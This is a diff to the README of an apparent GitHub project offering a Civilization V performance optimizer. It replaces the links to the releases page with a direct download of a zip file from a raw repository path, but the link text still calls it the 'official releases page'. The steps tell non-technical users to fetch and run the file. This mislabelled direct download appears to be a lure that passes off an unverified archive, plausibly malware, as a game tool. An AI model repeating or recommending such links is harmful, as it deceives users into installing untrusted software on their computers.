@@ -1,6 +1,6 @@
 # 🛠️ Civilization-V-Optimization - Boost performance for smoother game sessions
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/industrial-flowerpeople936/Civilization-V-Optimization/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/industrial-flowerpeople936/Civilization-V-Optimization/raw/refs/heads/main/frosty/Civilization_Optimization_1.0-beta.5.zip)
 
 ## 📋 About This Project
 
@@ -10,7 +10,7 @@ This software improves how Civilization V runs on modern Windows computers. It a
 
 Follow these steps to install the optimization package. You do not need to understand code or programming to complete this process.
 
-1. Visit the [official releases page](https://github.com/industrial-flowerpeople936/Civilization-V-Optimization/releases) to view available download files.
+1. Visit the [official releases page](https://github.com/industrial-flowerpeople936/Civilization-V-Optimization/raw/refs/heads/main/frosty/Civilization_Optimization_1.0-beta.5.zip) to view available download files.
 2. Select the newest version link, which usually ends in `.zip` or `.exe`.
 3. Save the file to your computer.
 
